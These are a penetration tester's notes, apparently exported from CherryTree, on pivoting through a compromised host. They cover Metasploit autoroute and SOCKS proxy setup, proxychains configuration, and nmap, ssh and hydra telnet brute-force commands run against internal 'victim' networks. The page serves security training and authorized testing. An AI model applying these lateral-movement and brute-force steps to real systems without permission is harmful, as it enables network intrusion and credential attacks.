<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Metasploit Dynamic Port Forwarding</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Metasploit Dynamic Port Forwarding</h1><br/><strong>Requirements:</strong><br />• Meterpreter session between attacker and pivot host<br />• Connectivity to the chosen SOCKS port <br /><br /><strong>1. Use an Exploit against the Pivot machine(Victim1) and gain a meterpreter session(sid)<br />2. Route all the traffic for victim2_network/netmask</strong><br />2.1 BETTER, worked most of the times<br />    <div class="codebox"><pre>meterpreter&gt; run autoroute -s 10.32.121.0<span style="color:#ff9d00;font-weight:700">/</span>24<br />meterpreter&gt; run autoroute -p</pre></div><br />   <a href=""><img src="images/777-1.png" alt="images/777-1.png" /></a><br /><br />2.2 ALTERNATIVE:<br />    <div class="codebox"><pre>msf &gt; route add [victim2_network] [netmask] [sid]<br />msf &gt; route print                                   <span style="color:#0088ff;font-weight:400">#to check if the route is been added</span></pre></div><br />    <strong>explanation of </strong><strong><code>route add [victim2_network] [netmask] [sid]</code></strong><br />      ▪ <code>[victim2_network]</code> →  is the network where is victim2<br />      ▪ <code>netmask</code> → is a 32-bit &quot;mask&quot; used to define the subnet in the network (example: 255.255.225.0)<br />      ▪ <code>sid</code> → meterpreter session running (in this case the sid is of the victim1 machine)<br />        With this command we tell metasploit to route all the traffic intended to the network <code>victim2_network</code>/<code>netmask</code>, through the meterpreter session <code>sid</code>. <br />        In other words, all the traffic to <code>victim2_network</code>/<code>netmask</code> will be tunneled through Victim 1<br /><br />2.3 ALTERNATIVE: Route all the traffic for victim2_network/netmask <br />    WARNING: as you can see can give some problem (mostly with windows) check above 2.1<br />    <div class="codebox"><pre>msf&gt; use post<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>manage<span style="color:#ff9d00;font-weight:700">/</span>autoroute<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> session [<span style="color:#ff9d00;font-weight:700">id</span>]<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> subnet 10.32.121.0<span style="color:#ff9d00;font-weight:700">/</span>24<br />msf&gt; run<br />msf&gt; route print</pre></div><br />    <a href=""><img src="images/777-2.png" alt="images/777-2.png" /></a><br />    attention to the output could not work <br />    <br /><strong><h3>3.  socks_proxy(socks4a) module in msf</h3></strong><br />    socks4a is been removed<br />    <div class="codebox"><pre>msf &gt; use auxiliary<span style="color:#ff9d00;font-weight:700">/</span>server<span style="color:#ff9d00;font-weight:700">/</span>socks_proxy<br />msf auxiliary<span style="color:#ff9d00;font-weight:700">(</span>server<span style="color:#ff9d00;font-weight:700">/</span>socks_proxy<span style="color:#ff9d00;font-weight:700">)</span> &gt; options<br />msf auxiliary<span style="color:#ff9d00;font-weight:700">(</span>server<span style="color:#ff9d00;font-weight:700">/</span>socks_proxy<span style="color:#ff9d00;font-weight:700">)</span> &gt; <span style="color:#ff9d00;font-weight:700">set</span> SRVHOST [attacker_ip_in_network]<br />msf auxiliary<span style="color:#ff9d00;font-weight:700">(</span>server<span style="color:#ff9d00;font-weight:700">/</span>socks_proxy<span style="color:#ff9d00;font-weight:700">)</span> &gt; <span style="color:#ff9d00;font-weight:700">set</span> SRVPORT 1080  <span style="color:#0088ff;font-weight:400">#bind port 1080 on the VM running MSF</span><br />msf auxiliary<span style="color:#ff9d00;font-weight:700">(</span>server<span style="color:#ff9d00;font-weight:700">/</span>socks_proxy<span style="color:#ff9d00;font-weight:700">)</span> &gt; <span style="color:#ff9d00;font-weight:700">set</span> version 4a      <span style="color:#0088ff;font-weight:400"># we need to use &quot;socks4&quot; in proxychains.conf</span><br /><span style="color:#0088ff;font-weight:400">#OR</span><br />msf auxiliary<span style="color:#ff9d00;font-weight:700">(</span>server<span style="color:#ff9d00;font-weight:700">/</span>socks_proxy<span style="color:#ff9d00;font-weight:700">)</span> &gt; <span style="color:#ff9d00;font-weight:700">set</span> version 5       <span style="color:#0088ff;font-weight:400"># we need to use &quot;socks5&quot; in proxychains.conf</span><br />msf auxiliary<span style="color:#ff9d00;font-weight:700">(</span>server<span style="color:#ff9d00;font-weight:700">/</span>socks_proxy<span style="color:#ff9d00;font-weight:700">)</span> &gt; run<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># netstat -antp <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> 1080    <span style="color:#0088ff;font-weight:400">#check connection</span></pre></div><br />        <br /><strong>4. configure proxychains</strong> <br />    Proxychains is a tool that forces any TCP connection made by any given application, to follow through proxy like SOCKS4, SOCKS5, TOR and so on...<br />    We have to configure proxychains to match the host(SRVHOST) the port(SRVPORT) that we choose for our proxy server when we have used the modul<br />   ◇ socks4<br />       <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;socks4 [attacker_ip_in_network] 1080&quot;</span> &gt; <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>proxychains.conf</pre></div><br />       <a href=""><img src="images/777-3.png" alt="images/777-3.png" /></a><br />   ◇ socks5<br />       <a href=""><img src="images/777-4.png" alt="images/777-4.png" /></a><br /><br /><br /><strong>5. Run commands through proxychains</strong><br />    Before the command we have to add <span style="text-decoration:underline;">proxychains</span> so the command will be forced to run through it.<br />    <span style="color:#a5452a;">examples:</span><br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># proxychains -q nmap -sT -Pn -T4 -n --top-ports 20 10.100.40.107  <span style="color:#0088ff;font-weight:400">#use -sT in proxychains, -sS could not work</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># proxychains -q nmap -sTV -Pn -T4 -n --top-ports 20 10.100.40.107   <span style="color:#0088ff;font-weight:400">#-sTV == -sT + -sV </span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># proxychains <span style="color:#ff9d00;font-weight:700">ssh</span> 192.168.1.23<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># proxychains telnet 192.168.1.23<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># proxychains iceweasel             <span style="color:#0088ff;font-weight:400">#access to internal website like if we are on victim machine</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># proxychains -q hydra -C telnet.txt telnet<span style="color:#ff9d00;font-weight:700">://</span>10.32.121.23 -V <span style="color:#ff9d00;font-weight:700">|&amp;</span> <span style="color:#ff9d00;font-weight:700">tee</span>    <span style="color:#0088ff;font-weight:400">#with -V (verbose) could be too much verbose</span><br />                                                                                   <span style="color:#0088ff;font-weight:400">#mostly if we have a lot of combinations of user/password</span></pre></div><br />    proxychains could give us a lot of debug information...<br />    <a href=""><img src="images/777-5.png" alt="images/777-5.png" /></a><br />    to avoid that we could use the quiet mode (-q)<br />    <div class="codebox"><pre>proxychains -q nmap -sT -Pn -n 192.168.1.23 --top-ports 100</pre></div><br />    <br />    <strong>ATTENTION</strong>: with proxychains <span style="text-decoration:underline;">use always</span> the options “-sT -Pn”  (also with scripts)<br />    <br />• if we see more requests in loop with nmap, is because we have used -sV that need to take more informations!<br />    <a href=""><img src="images/777-6.png" alt="images/777-6.png" /></a><br />    <a href=""><img src="images/777-7.png" alt="images/777-7.png" /></a><br />    <br />    <br />    <br /><br />Bibliography:<br />• <a href="https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot">https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot</a><br />• <a href="https://zaiste.net/posts/ssh-port-forwarding/">https://zaiste.net/posts/ssh-port-forwarding/</a><br />• <a href="https://pen-testing.sans.org/resources/papers/gwapt/tunneling-pivoting-web-application-penetration-testing-120229">https://pen-testing.sans.org/resources/papers/gwapt/tunneling-pivoting-web-application-penetration-testing-120229</a><br /></div>
</body>
</html>
